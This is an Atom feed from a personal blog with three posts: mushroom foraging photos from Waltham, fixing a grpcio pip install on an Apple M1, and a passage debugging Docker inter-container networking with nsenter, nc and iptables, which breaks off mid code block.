<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[David Xia]]></title>
  <link href="https://www.davidxia.com/atom.xml" rel="self"/>
  <link href="https://www.davidxia.com/"/>
  <updated>2021-08-07T12:59:02-04:00</updated>
  <id>https://www.davidxia.com/</id>
  <author>
    <name><![CDATA[David Xia]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Mushroom Foraging in Waltham]]></title>
    <link href="https://www.davidxia.com/2021/08/mushroom-foraging-in-waltham/"/>
    <updated>2021-08-07T11:53:58-04:00</updated>
    <id>https://www.davidxia.com/2021/08/mushroom-foraging-in-waltham</id>
    <content type="html"><![CDATA[<p>I collected mushrooms this morning with G and my parents. It rained a lot last week in
Waltham, MA. Many mushrooms had sprung up in Prospect Hill Park nearby. The temperature forecast
for today said the highs would be 32°C. So I wanted to go out in the morning while it was not too
hot. Over the objections of my mother, G, my father, and I picked different mushrooms and
carried them back to the car. Next time we&rsquo;ll bring a basket and a trowel. I took them back only to
identify them. I am definitely neither experienced nor confident enough to eat any wild mushrooms I
find.</p>

<p><strong>Do not use this post as any basis for consuming mushrooms yourself. Some mushrooms are extremely
poisonous and can be fatal if ingested.</strong></p>

<p>Here&rsquo;s photos of what we found and my amateur guess at what they are.</p>

<p><img class="center" src="https://i.imgur.com/Ws1IRx1h.jpg"></p>

<!-- more -->


<h2>Russula cremoricolor (Creamy Russula)</h2>

<p><img class="center" src="https://i.imgur.com/PThequEh.jpg">
<img class="center" src="https://i.imgur.com/rLu3aqCh.jpg">
<img class="center" src="https://i.imgur.com/bYureAHh.jpg">
<img class="center" src="https://i.imgur.com/lHr7464h.jpg"></p>

<h2>Russula brevipes (Short-Stemmed Russula)</h2>

<p><img class="center" src="https://i.imgur.com/j9hEaxbh.jpg">
<img class="center" src="https://i.imgur.com/eO5MxIMh.jpg">
<img class="center" src="https://i.imgur.com/Fq66oRSh.jpg"></p>

<h2>Russula albonigra</h2>

<p><img class="center" src="https://i.imgur.com/6d88fa2h.jpg">
<img class="center" src="https://i.imgur.com/y4vVfllh.jpg">
<img class="center" src="https://i.imgur.com/kXXmR1Qh.jpg"></p>

<h2>Amanita bisporigera (Destroying angel)</h2>

<p><img class="center" src="https://i.imgur.com/TdU6v0ih.jpg">
<img class="center" src="https://i.imgur.com/W2GwWT2h.jpg"></p>

<h2>some type of Grisette</h2>

<p><img class="center" src="https://i.imgur.com/3xicjwZh.jpg">
<img class="center" src="https://i.imgur.com/fA2LEbzh.jpg">
<img class="center" src="https://i.imgur.com/MNauz2Sh.jpg"></p>

<h2>Boletus pseudosensibilis</h2>

<p>We saw what I think is a <a href="https://www.mushroomexpert.com/boletus_pseudosensibilis.html">Boletus pseudosensibilis</a>, but my mom snatched it out of my hands and
threw it away before I could take it home.</p>

<h2>Monotropa uniflora (Ghost pipe)</h2>

<p>Monotropa uniflora isn&rsquo;t a fungus but needs them. It has no chlorophyll and doesn&rsquo;t depend on
photosynthesis. It&rsquo;s a saprophyte that gets nutrients by tapping into the resources of trees,
indirectly through myccorhizal fungi.</p>

<p><img class="center" src="https://i.imgur.com/6Vaadzlh.jpg">
<img class="center" src="https://i.imgur.com/kEvKCqhh.jpg"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Install Grpcio Pip Package on Apple M1]]></title>
    <link href="https://www.davidxia.com/2021/05/how-to-install-grpcio-pip-package-on-apple-m1/"/>
    <updated>2021-05-08T22:42:53-07:00</updated>
    <id>https://www.davidxia.com/2021/05/how-to-install-grpcio-pip-package-on-apple-m1</id>
    <content type="html"><![CDATA[<p>I spent a long time figuring out how to install the latest <a href="https://pypi.org/project/grpcio/">grpcio</a> Pip package (version 1.37.1) on
my Apple M1 Macbook.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pip install grpcio
</span><span class='line'>
</span><span class='line'>Looking in indexes: https://pypi.org/simple, https://artifactory.spotify.net/artifactory/api/pypi/pypi/simple
</span><span class='line'>Collecting grpcio
</span><span class='line'>  Downloading https://artifactory.spotify.net/artifactory/api/pypi/pypi/packages/packages/a0/d6/d04c6550debe23e2eaef0d9c4adccbb6e20d8cce6da40ae989fe8836e287/grpcio-1.37.1.tar.gz (21.7 MB)
</span><span class='line'>     |████████████████████████████████| 21.7 MB 143 kB/s
</span><span class='line'>Requirement already satisfied: six&gt;=1.5.2 in ./.virtualenvs/spotify/lib/python3.9/site-packages (from grpcio) (1.12.0)
</span><span class='line'>Building wheels for collected packages: grpcio
</span><span class='line'>  Building wheel for grpcio (setup.py) ... error
</span><span class='line'>  ERROR: Command errored out with exit status 1:
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>  third_party/zlib/gzlib.c:252:9: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
</span><span class='line'>          LSEEK(state-&gt;fd, 0, SEEK_END);  /* so gzoffset() is correct */
</span><span class='line'>          ^
</span><span class='line'>  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
</span><span class='line'>  #  define LSEEK lseek
</span><span class='line'>                  ^
</span><span class='line'>  third_party/zlib/gzlib.c:252:9: note: did you mean 'fseek'?
</span><span class='line'>  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
</span><span class='line'>  #  define LSEEK lseek
</span><span class='line'>                  ^
</span><span class='line'>  /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/stdio.h:162:6: note: 'fseek' declared here
</span><span class='line'>  int      fseek(FILE *, long, int);
</span><span class='line'>           ^
</span><span class='line'>  third_party/zlib/gzlib.c:258:24: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
</span><span class='line'>          state-&gt;start = LSEEK(state-&gt;fd, 0, SEEK_CUR);
</span><span class='line'>                         ^
</span><span class='line'>  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
</span><span class='line'>  #  define LSEEK lseek
</span><span class='line'>                  ^
</span><span class='line'>  third_party/zlib/gzlib.c:359:9: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
</span><span class='line'>      if (LSEEK(state-&gt;fd, state-&gt;start, SEEK_SET) == -1)
</span><span class='line'>          ^
</span><span class='line'>  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
</span><span class='line'>  #  define LSEEK lseek
</span><span class='line'>                  ^
</span><span class='line'>  third_party/zlib/gzlib.c:400:15: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
</span><span class='line'>          ret = LSEEK(state-&gt;fd, offset - state-&gt;x.have, SEEK_CUR);
</span><span class='line'>                ^
</span><span class='line'>  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
</span><span class='line'>  #  define LSEEK lseek
</span><span class='line'>                  ^
</span><span class='line'>  third_party/zlib/gzlib.c:496:14: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
</span><span class='line'>      offset = LSEEK(state-&gt;fd, 0, SEEK_CUR);
</span><span class='line'>               ^
</span><span class='line'>  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
</span><span class='line'>  #  define LSEEK lseek
</span><span class='line'>                  ^
</span><span class='line'>  5 errors generated.
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>  clang -Wno-unused-result -Wsign-compare -Wunreachable-code -DNDEBUG -g -fwrapv -O3 -Wall -I/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include -I/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include -I/Users/dxia/.virtualenvs/spotify/include -I/Users/dxia/.pyenv/versions/3.9.1/include/python3.9 -c /var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/tmpyvic7ha6/a.c -o None/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/tmpyvic7ha6/a.o
</span><span class='line'>  Traceback (most recent call last):
</span><span class='line'>    File "/Users/dxia/.pyenv/versions/3.9.1/lib/python3.9/distutils/unixccompiler.py", line 117, in _compile
</span><span class='line'>      self.spawn(compiler_so + cc_args + [src, '-o', obj] +
</span><span class='line'>    File "/private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-install-1ha5py6y/grpcio_12658497b5464faa852de046ce91485a/src/python/grpcio/_spawn_patch.py", line 54, in _commandfile_spawn
</span><span class='line'>      _classic_spawn(self, command)
</span><span class='line'>    File "/Users/dxia/.pyenv/versions/3.9.1/lib/python3.9/distutils/ccompiler.py", line 910, in spawn
</span><span class='line'>      spawn(cmd, dry_run=self.dry_run)
</span><span class='line'>    File "/Users/dxia/.pyenv/versions/3.9.1/lib/python3.9/distutils/spawn.py", line 87, in spawn
</span><span class='line'>      raise DistutilsExecError(
</span><span class='line'>  distutils.errors.DistutilsExecError: command '/usr/bin/clang' failed with exit code 1
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>    ----------------------------------------
</span><span class='line'>ERROR: Command errored out with exit status 1: /Users/dxia/.virtualenvs/spotify/bin/python -u -c 'import io, os, sys, setuptools, tokenize; sys.argv[0] = '"'"'/private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-install-1ha5py6y/grpcio_12658497b5464faa852de046ce91485a/setup.py'"'"'; __file__='"'"'/private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-install-1ha5py6y/grpcio_12658497b5464faa852de046ce91485a/setup.py'"'"';f = getattr(tokenize, '"'"'open'"'"', open)(__file__) if os.path.exists(__file__) else io.StringIO('"'"'from setuptools import setup; setup()'"'"');code = f.read().replace('"'"'\r\n'"'"', '"'"'\n'"'"');f.close();exec(compile(code, __file__, '"'"'exec'"'"'))' install --record /private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-record-n4ihfdh1/install-record.txt --single-version-externally-managed --compile --install-headers /Users/dxia/.virtualenvs/spotify/include/site/python3.9/grpcio Check the logs for full command output.</span></code></pre></td></tr></table></div></figure>


<p>Fixed by setting the following (I use <a href="https://fishshell.com">fish shell</a>). I found the first four environment variables in
this <a href="https://github.com/grpc/grpc/issues/24677#issuecomment-729983060">Github comment</a>. The second two I knew to add because I was seeing errors about the compiler
not being able to find the openssl.h and re.h header files.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>set -x GRPC_BUILD_WITH_BORING_SSL_ASM ""
</span><span class='line'>set -x GRPC_PYTHON_BUILD_SYSTEM_RE2 true
</span><span class='line'>set -x GRPC_PYTHON_BUILD_SYSTEM_OPENSSL true
</span><span class='line'>set -x GRPC_PYTHON_BUILD_SYSTEM_ZLIB true
</span><span class='line'>set -x CPPFLAGS "-I"(brew --prefix openssl)"/include -I"(brew --prefix re2)"/include"
</span><span class='line'>set -x LDFLAGS "-L"(brew --prefix openssl)"/lib -L"(brew --prefix re2)"/lib"</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What I Recently Learned About Docker Networking and Debugging Networking Issues in General]]></title>
    <link href="https://www.davidxia.com/2021/05/what-i-recently-learned-about-docker-networking-and-debugging-network-issues-in-general/"/>
    <updated>2021-05-02T16:39:02-07:00</updated>
    <id>https://www.davidxia.com/2021/05/what-i-recently-learned-about-docker-networking-and-debugging-network-issues-in-general</id>
    <content type="html"><![CDATA[<p>This is a story about how debugged a confounding local development environment issue, what I
learned about Docker in the process, and the generally applicable debugging strategies and
techniques that helped me ultimately solve it. Skip to the end if you only want to read the
debugging strategies and techniques. The overall story, however, will illustrate how they applied
in this specific case.</p>

<h2>Problem Statement and Use Case</h2>

<p>A data infrastructure team at work provides a tool for starting a data pipeline job from a local
development environment. Let&rsquo;s call this tool <code>foo</code>. This tool depends on <code>gcloud</code> and <code>docker</code>.
It creates a user-defined Docker network, runs a utility container called <code>bar</code> connected to that
network, and then runs another container called qux that talks to bar to retrieve Oauth tokens
from Google Cloud Platform (GCP).</p>

<p>Most developers run <code>foo</code> on their local workstations, e.g. Macbooks. But I have the newer
Macbook with the Apple M1 ARM-based chip. <a href="https://docs.docker.com/docker-for-mac/install/">Docker Desktop on Mac</a> support for M1s was
relatively recent. I didn&rsquo;t want deal with Docker weirdness. I also didn&rsquo;t have a lot of free
disk space on my 256GB Macbook and thus didn&rsquo;t feel like clogging up my drive with lots of Java,
Scala, and Docker gunk.</p>

<p>So I tried running <code>foo</code> on a GCE VM configured by our <a href="https://puppet.com/">Puppet</a> configuration files. I ran <code>foo</code>,
I got this error.</p>

<!-- more -->


<h2>Error #1: inter-container networking failed between containers attached to user-defined Docker networks</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ foo --verbose run -f data-info.yaml -w DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name
</span><span class='line'>DEBUG:verify: Docker network `foo-network` already exists
</span><span class='line'>DEBUG:verify: bar container found.
</span><span class='line'>INFO:run: starting workflow DumpKubernetesContainerImagesJob ...
</span><span class='line'>ERROR: (gcloud.auth.activate-service-account) [Errno 110] Connection timed out
</span><span class='line'>This may be due to network connectivity issues. Please check your network settings, and the status of the service you are trying to reach.
</span><span class='line'>Traceback (most recent call last):
</span><span class='line'>  File "/usr/local/bin/activate-google-application-credentials", line 19, in &lt;module&gt;
</span><span class='line'>    'auth', 'activate-service-account', '--key-file', json_path])
</span><span class='line'>  File "/usr/lib/python3.6/subprocess.py", line 311, in check_call
</span><span class='line'>    raise CalledProcessError(retcode, cmd)
</span><span class='line'>subprocess.CalledProcessError: Command '['gcloud', 'auth', 'activate-service-account', '--key-file', '/etc/_foo/gcp-sa-key.json']' returned non-zero exit status 1.
</span><span class='line'>ERROR:foo:
</span><span class='line'>
</span><span class='line'>  RAN: /usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-26 -e FOO_DOCKER_IMAGE=my-project:20210426T211411-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26' -e FOO_EXECUTION_ID=foorun-2e30c385-2f89-494c-bc0e-97b3eff316d5 -e FOO_TRIGGER_ID=foo-942f155b-49eb-4af8-a6e4-3adf6f72577b -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210426T211411-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26
</span><span class='line'>
</span><span class='line'>  STDOUT:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  STDERR:
</span><span class='line'>Traceback (most recent call last):
</span><span class='line'>  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/foo.py", line 304, in main
</span><span class='line'>    args.func(args)
</span><span class='line'>  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/foo.py", line 269, in _run
</span><span class='line'>    args.declarative_infra,
</span><span class='line'>  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/run.py", line 641, in run_workflow
</span><span class='line'>    declarative_infra,
</span><span class='line'>  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/run.py", line 161, in _run_workflow
</span><span class='line'>    p.wait()
</span><span class='line'>  File "/home/dxia/my-project//lib/python3.6/site-packages/sh.py", line 841, in wait
</span><span class='line'>    self.handle_command_exit_code(exit_code)
</span><span class='line'>  File "/home/dxia/my-project//lib/python3.6/site-packages/sh.py", line 865, in handle_command_exit_code
</span><span class='line'>    raise exc
</span><span class='line'>sh.ErrorReturnCode_1:
</span><span class='line'>
</span><span class='line'>  RAN: /usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-26 -e FOO_DOCKER_IMAGE=my-project:20210426T211411-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26' -e FOO_EXECUTION_ID=foorun-2e30c385-2f89-494c-bc0e-97b3eff316d5 -e FOO_TRIGGER_ID=foo-942f155b-49eb-4af8-a6e4-3adf6f72577b -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210426T211411-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26
</span><span class='line'>
</span><span class='line'>  STDOUT:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  STDERR:</span></code></pre></td></tr></table></div></figure>


<p>The HTTP connection timed out. First I checked whether the container started by <code>foo</code> can make a TCP
connection to the bar container. I ran <code>foo --verbose run -f data-info.yaml -w
DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name</code>
again and did the following in another terminal window.</p>

<p><a href="https://man7.org/linux/man-pages/man1/nsenter.1.html"><code>nsenter</code></a> is a cool tool that allows you to run programs in different Linux namespaces.
It&rsquo;s very useful when you can&rsquo;t get an executable shell into a container with commands like
<code>docker exec -it ... bash</code>. This can happen when the container doesn&rsquo;t even include any shells
and just has the binary executable for instance.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ docker ps
</span><span class='line'>CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
</span><span class='line'>a0e872188831        my-project:20210426T211411-2b5452d         "/usr/local/bin/edge…"   2 seconds ago       Up 1 second                                   relaxed_pike
</span><span class='line'>4dda670a2ee1        foo/bar:latest                                   "./bar"               2 hours ago         Up 2 hours          0.0.0.0:80-&gt;80/tcp        bar
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  a0e872188831)  nc 172.20.0.127 80 -nvz -w 5
</span><span class='line'>(UNKNOWN) [172.20.0.127] 80 (http) : Connection timed out</span></code></pre></td></tr></table></div></figure>


<p>So the HTTP connection timeout was caused by an error lower down on the networking stack: an
inability to establish a TCP connection. A TCP connection from the host to bar worked though.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ nc 172.20.0.127 80 -nvz -w 5
</span><span class='line'>(UNKNOWN) [172.20.0.127] 80 (http) open</span></code></pre></td></tr></table></div></figure>


<p>When I see a networking issue like this, I know there might be some misconfigured firewall rule
blocking IP packets. I listed all the firewall rules. The ones in the filter table&rsquo;s <code>FORWARD</code>
chain caught my attention.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
</span><span class='line'>Chain FORWARD (policy DROP 38 packets, 2280 bytes)
</span><span class='line'>num   pkts bytes target     prot opt in     out     source               destination
</span><span class='line'>1     6204  492K DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
</span><span class='line'>2     6204  492K DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
</span><span class='line'>3     3080  323K ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
</span><span class='line'>4        1    60 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>5     3085  167K ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>7      264 17722 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>8     7382   17M ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0</span></code></pre></td></tr></table></div></figure>


<p>I disabled the GCE VM&rsquo;s cronned Puppet run and then ran <code>sudo systemctl restart docker</code>. I ran
bar and a test nginx1 container connected to <code>foo-network</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ docker run --rm -d -v ~/.config/gcloud/:/.config/gcloud --name bar --net foo-network --ip 172.20.0.127 -p 80:80 foo/bar:latest
</span><span class='line'>3f9cc17b3f71e7056fd8072449afa78eb9a6a166ac091d751b69545ead0438b1
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ docker run --net foo-network --name nginx1 -d -p 8080:80 nginx:latest
</span><span class='line'>1b0b2b981f9389a989aa8f60a141b5e9a18ba5582141b6668c9078b6312dcfaf
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ docker ps
</span><span class='line'>CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED              STATUS              PORTS                     NAMES
</span><span class='line'>1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   5 seconds ago        Up 3 seconds        0.0.0.0:8080-&gt;80/tcp      nginx1
</span><span class='line'>3f9cc17b3f71        foo/bar:latest                                   "./bar"               About a minute ago   Up 59 seconds       0.0.0.0:80-&gt;80/tcp        bar</span></code></pre></td></tr></table></div></figure>


<p>Now a TCP connection from the nginx container to bar succeeded.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo nsenter --net=$(docker inspect --format  nginx1) nc 172.20.0.127 80 -nvz -w 5
</span><span class='line'>(UNKNOWN) [172.20.0.127] 80 (http) open</span></code></pre></td></tr></table></div></figure>


<p>I checked iptables rules again and saw two additional rules (7 and 8) in the filter table&rsquo;s
<code>FORWARD</code> chain. Rule 8 allowed IP packets coming in from the <code>br-8ce7e363e4f9</code> network interface
(in this case a <a href="https://developers.redhat.com/blog/2018/10/22/introduction-to-linux-interfaces-for-virtual-networking/#bridge">Linux bridge</a>) and leaving through the same interface.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
